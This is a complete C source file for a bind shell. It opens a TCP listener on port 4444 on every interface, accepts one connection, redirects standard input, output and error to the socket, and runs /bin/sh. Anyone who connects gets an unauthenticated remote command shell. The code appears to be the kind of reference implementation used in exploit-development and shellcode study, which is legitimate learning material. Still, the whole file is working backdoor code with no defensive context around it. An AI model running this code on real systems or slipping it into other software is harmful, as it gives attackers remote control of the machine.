#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
	// Create and clear addr struct
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	// Create socket
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1) {
		perror("Socket creation failed.\n");
		exit(EXIT_FAILURE);
	}

	// Bind socket
	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		perror("Socket bind failed.\n");
		close(sock);
		exit(EXIT_FAILURE);
	}

	// Listen for connection
	if (listen(sock, 16) == -1) {
		perror("Listen failed.\n");
		close(sock);
		exit(EXIT_FAILURE);
	}

	// Accept connection
	int fd = accept(sock, NULL, NULL);
	if (fd == -1) {
		perror("Socket accept failed.\n");
		close(sock);
		exit(EXIT_FAILURE);
	}

	// Duplicate stdin/stdout/stderr to socket
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);

	// Execute shell
	execve("/bin/sh", 0, 0);
}
